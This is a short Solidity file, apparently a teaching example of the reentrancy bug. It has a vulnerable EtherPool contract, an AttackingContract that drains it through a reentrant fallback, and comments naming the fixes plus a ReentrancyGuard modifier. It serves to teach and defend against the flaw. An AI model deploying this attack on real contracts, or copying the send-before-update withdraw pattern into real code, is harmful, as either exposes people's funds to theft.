//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0; 

contract EtherPool {

    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    //withdraw function can be exploited by calling multiple times before the balance updated
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "not fund to withdraw");
        (bool success, ) = msg.sender.call{value : balance}("");
        require(success, "failed to withdraw");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackingContract {

    EtherPool public pool;

    constructor(address _poolContract) {
        pool = EtherPool(_poolContract);
    }

    fallback() external payable {
        if(address(pool).balance >= 1 ether) {
            pool.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        pool.deposit{value: 1 ether}();
        pool.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}

// solution : 1) Updating balance to 0 first before function call 2) Implementing Re-Entrancy Guard
// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/security/ReentrancyGuard.sol

contract ReEntrancyGuard {

    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

